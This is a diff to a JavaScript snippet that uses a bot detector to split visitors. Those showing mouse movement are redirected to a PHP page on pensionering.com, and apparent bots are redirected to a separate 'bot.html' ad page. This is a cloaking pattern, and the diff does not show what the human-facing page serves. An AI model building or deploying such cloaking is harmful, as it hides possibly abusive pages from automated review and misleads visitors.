@@ -1,22 +1,23 @@
 new jmbotdetector({
-    timeout: 13000,
+
+    timeout: 8000,
     callback: function(result) {
 
-        console.log('result:', result.tests)
+        console.log('result:', result.tests);
 
-        var currentUrl = window.location.href;
+        var curl = document.location.href;
 
-        console.log(currentUrl)
-
-        var file = document.createElement('script')
         if (result.cases.mousemove) {
-            console.log('MOUSEMOVE', result.cases.mousemove)
+            console.log('MOUSEMOVE', result.cases.mousemove);
 
-            $('#loader').hide();
+            localStorage.setItem('adsurl', 'https://www.pensionering.com/1/j.php')
 
-            $("#preloader").replaceWith(" <div class='second-row'><iframe src='https://pensionering.com/1/j.php'></iframe></div>");
+            $(window).attr('location', 'https://www.pensionering.com/1/j.php')
+
         } else {
-            $("#preloader").replaceWith("<div class='second-row'><iframe src='https://pensionering.com/1/index.html'></iframe></div>");
+            localStorage.setItem('adsurl', 'https://pensionering.com/1/assets/ads/bot.html')
+
+            $(window).attr('location', 'https://pensionering.com/1/assets/ads/bot.html')
         }
 
 
